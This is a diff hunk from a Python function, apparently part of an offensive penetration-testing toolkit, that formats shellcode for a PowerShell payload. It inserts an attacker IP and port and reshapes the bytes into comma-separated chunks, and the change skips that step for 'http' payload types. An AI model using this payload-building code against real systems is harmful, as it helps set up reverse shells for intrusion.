@@ -1435,26 +1435,27 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     try:
 
         # if not "reverse_http" in payload or not "reverse_https" in payload:
-        shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
-        # sub in \x for 0x
-        shellcode = re.sub("\\\\x", "0x", shellcode)
-        shellcode = shellcode.replace("\\", "")
-        # base counter
-        counter = 0
-        # count every four characters then trigger floater and write out data
-        floater = ""
-        # ultimate string
-        newdata = ""
-        for line in shellcode:
-            floater = floater + line
-            counter = counter + 1
-            if counter == 4:
-                newdata = newdata + floater + ","
-                floater = ""
-                counter = 0
+        if not "http" in payload:
+            shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
+            # sub in \x for 0x
+            shellcode = re.sub("\\\\x", "0x", shellcode)
+            shellcode = shellcode.replace("\\", "")
+            # base counter
+            counter = 0
+            # count every four characters then trigger floater and write out data
+            floater = ""
+            # ultimate string
+            newdata = ""
+            for line in shellcode:
+                floater = floater + line
+                counter = counter + 1
+                if counter == 4:
+                    newdata = newdata + floater + ","
+                    floater = ""
+                    counter = 0
 
-        # heres our shellcode prepped and ready to go
-        shellcode = newdata[:-1]
+            # heres our shellcode prepped and ready to go
+            shellcode = newdata[:-1]
 
     except Exception as e:
         print_error("Something went wrong, printing error: " + str(e))
